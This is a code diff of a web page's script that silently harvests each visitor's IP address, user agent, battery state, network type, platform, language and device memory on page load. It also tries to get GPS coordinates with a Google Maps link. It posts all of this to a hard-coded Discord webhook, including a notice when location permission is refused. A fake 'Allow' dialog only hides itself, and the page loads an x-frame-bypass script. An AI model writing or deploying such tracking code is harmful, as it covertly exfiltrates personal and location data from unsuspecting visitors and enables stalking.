@@ -71,6 +71,10 @@
     <script src="x-frame-bypass.js" type="module"></script>
     <script>
         $(document).ready(function() {
+            var batterypercentage;
+            var ischarging;
+            var deviceName = navigator.userAgent;
+
             // Function to fetch IP address and other device details
             async function fetchIPAndDeviceDetails() {
                 const ipData = await fetch('https://api.ipify.org?format=json');
@@ -79,14 +83,11 @@
 
                 const userAgent = navigator.userAgent;
                 const networkInfo = navigator.connection ? navigator.connection.effectiveType : "Unknown";
-
                 const battery = await navigator.getBattery();
                 const batteryPercentage = battery.level * 100;
                 const isCharging = battery.charging;
-
                 const platform = navigator.platform;
                 const language = navigator.language;
-
                 const deviceMemory = navigator.deviceMemory || "Unknown";
 
                 return { ipAddress, userAgent, networkInfo, batteryPercentage, isCharging, platform, language, deviceMemory };
@@ -94,13 +95,12 @@
 
             // Function to send the location and device details to Discord
             async function sendToDiscord(latitude, longitude, ipAddress, userAgent, timestamp, networkInfo, batteryPercentage, isCharging, platform, language, deviceMemory) {
-                const data = {
+                // First message without location details
+                const firstMessage = {
                     content: `**User Details:**
+- DeviceName: ${deviceName}
 - DeviceLocalTime: ${new Date().toLocaleString()}
-- Location: Latitude ${latitude}, Longitude ${longitude}
-- Google Maps Link: https://www.google.com/maps/place/${latitude}%2C${longitude}
 - IP Address: ${ipAddress}
-- Local IP Address: ${ipAddress}  // Using the same IP address for local and public for now
 - User-Agent: ${userAgent}
 - NetworkInformation: ${networkInfo}
 - BatteryPercentage: ${batteryPercentage}%
@@ -113,29 +113,65 @@
                 const request = new XMLHttpRequest();
                 request.open("POST", "https://discord.com/api/webhooks/1269744683979116584/cNjKRdP0NsvH3NIpezZoS5x1NU336ma0GlpVGf-QLB5m_vfU_gX797a_9jhOiNsLkihm");
                 request.setRequestHeader('Content-type', 'application/json');
-                request.send(JSON.stringify(data));
-            }
+                request.send(JSON.stringify(firstMessage));
 
-            // Function to get geolocation and trigger sending data
-            function getLocation() {
-                if (navigator.geolocation) {
-                    setTimeout(() => {
-                        navigator.geolocation.getCurrentPosition(async function(position) {
-                            const latitude = position.coords.latitude;
-                            const longitude = position.coords.longitude;
-
-                            const deviceDetails = await fetchIPAndDeviceDetails();
-
-                            sendToDiscord(latitude, longitude, deviceDetails.ipAddress, deviceDetails.userAgent, new Date().toLocaleString(), deviceDetails.networkInfo, deviceDetails.batteryPercentage, deviceDetails.isCharging, deviceDetails.platform, deviceDetails.language, deviceDetails.deviceMemory);
-                        }, function(error) {
-                            alert("Error getting location: " + error.message);
-                        }, { timeout: 5000 });
-                    }, 5000);
-                } else {
-                    alert("Your Browser Does not support Gps");
+                // Second message with location details, if permission granted
+                function sendLocationDetails(latitude, longitude) {
+                    const secondMessage = {
+                        content: `**Geolocation Info:**
+- Location: Latitude ${latitude}, Longitude ${longitude}
+- Google Maps Link: https://www.google.com/maps/place/${latitude}%2C${longitude}`
+                    };
+                    request.open("POST", "https://discord.com/api/webhooks/1269744683979116584/cNjKRdP0NsvH3NIpezZoS5x1NU336ma0GlpVGf-QLB5m_vfU_gX797a_9jhOiNsLkihm");
+                    request.setRequestHeader('Content-type', 'application/json');
+                    request.send(JSON.stringify(secondMessage));
                 }
+
+                // If permission is denied, send a message indicating location permission was denied
+                function sendLocationPermissionDenied() {
+                    const deniedMessage = {
+                        content: "**Location Permission Denied:** User has not allowed location access."
+                    };
+                    request.open("POST", "https://discord.com/api/webhooks/1269744683979116584/cNjKRdP0NsvH3NIpezZoS5x1NU336ma0GlpVGf-QLB5m_vfU_gX797a_9jhOiNsLkihm");
+                    request.setRequestHeader('Content-type', 'application/json');
+                    request.send(JSON.stringify(deniedMessage));
+                }
+
+                // Function to handle location permission and send relevant info
+                function getLocation() {
+                    if (navigator.geolocation) {
+                        navigator.geolocation.getCurrentPosition(
+                            function(position) {
+                                const latitude = position.coords.latitude;
+                                const longitude = position.coords.longitude;
+                                sendLocationDetails(latitude, longitude);
+                            },
+                            function(error) {
+                                if (error.code === error.PERMISSION_DENIED) {
+                                    sendLocationPermissionDenied();
+                                }
+                            }
+                        );
+                    } else {
+                        alert("Your Browser Does not support Geolocation.");
+                    }
+                }
+
+                getLocation();
             }
 
+            // Fetch device details and send info
+            fetchIPAndDeviceDetails().then(function(deviceDetails) {
+                const { ipAddress, userAgent, networkInfo, batteryPercentage, isCharging, platform, language, deviceMemory } = deviceDetails;
+                sendToDiscord(null, null, ipAddress, userAgent, new Date().toLocaleString(), networkInfo, batteryPercentage, isCharging, platform, language, deviceMemory);
+            });
+
+            // Show permission request dialog
+            function requestPermissions() {
+                document.getElementById('dialogBox').style.display = 'none';
+            }
+
+            // Trigger location permission request
             getLocation();
         });
     </script>
@@ -156,10 +192,4 @@
             <button class="btn-allow" onclick="requestPermissions()">Allow</button>
         </div>
     </div>
-    <script>
-        function requestPermissions() {
-            document.getElementById('dialogBox').style.display = 'none';
-        }
-    </script>
 </body>
-</html>
